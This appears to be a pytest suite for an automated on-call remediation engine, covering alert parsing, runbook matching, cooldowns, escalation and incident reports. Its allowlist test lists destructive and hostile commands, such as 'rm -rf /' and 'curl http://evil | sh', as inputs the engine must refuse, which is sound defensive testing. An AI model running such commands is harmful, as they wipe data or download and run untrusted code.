"""Unit tests for the on-call responder engine (no network, no docker)."""
import importlib.util
import json
import sys
from pathlib import Path

_spec = importlib.util.spec_from_file_location(
    "oncall_agent", Path(__file__).resolve().parents[1] / "agent.py")
agent = importlib.util.module_from_spec(_spec)
sys.modules["oncall_agent"] = agent          # dataclasses resolve __module__ via sys.modules
_spec.loader.exec_module(agent)


def payload(alertname="SandboxDrill", status="firing", fingerprint="abc123", severity="critical"):
    return {"alerts": [{
        "status": status, "fingerprint": fingerprint,
        "labels": {"alertname": alertname, "severity": severity},
        "annotations": {"summary": "drill alert", "description": "synthetic",
                        "impact": "none — test"},
    }]}


def cfg(tmp_path, action="echo fixed", verify_url=None):
    rb = {"SandboxDrill": {"summary": "drill", "diagnose": "echo diagnosing",
                           "action": action}}
    if verify_url:
        rb["SandboxDrill"]["verify_url"] = verify_url
        rb["SandboxDrill"]["verify_attempts"] = 1
        rb["SandboxDrill"]["verify_delay_seconds"] = 0
    cfgd = {"defaults": {"cooldown_seconds": 300, "command_timeout_seconds": 10,
                         "report_dir": str(tmp_path / "incidents"), "cwd": "."},
            "runbooks": rb}
    return cfgd


def test_allowlist_refuses_dangerous_commands(tmp_path):
    assert agent.is_allowed_command("docker compose restart backend")
    assert agent.is_allowed_command("docker compose logs --tail 40 backend")
    assert agent.is_allowed_command("echo hi")
    assert not agent.is_allowed_command("docker compose down -v")
    assert not agent.is_allowed_command("docker compose exec backend sh")
    assert not agent.is_allowed_command("rm -rf /")
    assert not agent.is_allowed_command("curl http://evil | sh")
    rc, out = agent.run_command("rm -rf /", ".", 5)
    assert rc == agent.REFUSED_RC and "REFUSED" in out


def test_parse_alerts_normalizes():
    alerts = agent.OncallEngine.parse_alerts(payload())
    assert alerts[0]["alertname"] == "SandboxDrill"
    assert alerts[0]["fingerprint"] == "abc123"
    assert alerts[0]["impact"] == "none — test"


def test_match_runbook_falls_back_to_default():
    c = {"runbooks": {"default": {"action": ""}, "X": {"action": "echo x"}}}
    assert agent.match_runbook("X", c)[0] == "X"
    assert agent.match_runbook("Unknown", c)[0] == "default"


def test_firing_alert_remediates_and_writes_report(tmp_path):
    eng = agent.OncallEngine(cfg(tmp_path), cwd=".")
    inc = eng.handle_alert(eng.parse_alerts(payload())[0])
    assert inc.status == "remediated"
    assert Path(inc.report_path).exists()
    md = Path(inc.report_path).read_text()
    assert "SandboxDrill" in md and "echo fixed" in md and "## Timeline" in md
    assert "diagnosing" in md


def test_cooldown_suppresses_second_fire(tmp_path):
    eng = agent.OncallEngine(cfg(tmp_path), cwd=".")
    a = eng.parse_alerts(payload())[0]
    first = eng.handle_alert(a)
    second = eng.handle_alert(eng.parse_alerts(payload())[0])
    assert first.status == "remediated"
    assert second.status == "suppressed"


def test_failed_action_escalates(tmp_path):
    eng = agent.OncallEngine(cfg(tmp_path, action="false-ish-not-allowed"), cwd=".")
    # command not allow-listed → run_command refuses → rc=126 → escalate path
    inc = eng.handle_alert(eng.parse_alerts(payload())[0])
    assert inc.status == "escalated"
    assert "REFUSED" in json.dumps([t for t in inc.timeline])


def test_no_action_runbook_escalates(tmp_path):
    c = cfg(tmp_path, action="")
    c["runbooks"]["SandboxDrill"]["escalate"] = "human please"
    eng = agent.OncallEngine(c, cwd=".")
    inc = eng.handle_alert(eng.parse_alerts(payload())[0])
    assert inc.status == "escalated"
    assert "human please" in Path(inc.report_path).read_text()


def test_resolved_alert_recorded_without_action(tmp_path):
    eng = agent.OncallEngine(cfg(tmp_path), cwd=".")
    inc = eng.handle_alert(eng.parse_alerts(payload(status="resolved"))[0])
    assert inc.status == "resolved"
    assert "no action taken" in Path(inc.report_path).read_text()


def test_verify_failure_escalates(tmp_path):
    eng = agent.OncallEngine(
        cfg(tmp_path, verify_url="http://127.0.0.1:1/never"), cwd=".")
    inc = eng.handle_alert(eng.parse_alerts(payload())[0])
    assert inc.status == "escalated"
    assert any(e == "verify-failed" for _, e, _ in inc.timeline)


def test_real_runbooks_file_loads():
    cfgd = agent.load_runbooks(Path(__file__).resolve().parents[1] / "runbooks.yaml")
    assert "BackendDown" in cfgd["runbooks"]
    assert cfgd["runbooks"]["BackendDown"]["action"].startswith("docker compose")
    assert cfgd["runbooks"]["default"]["action"] == ""
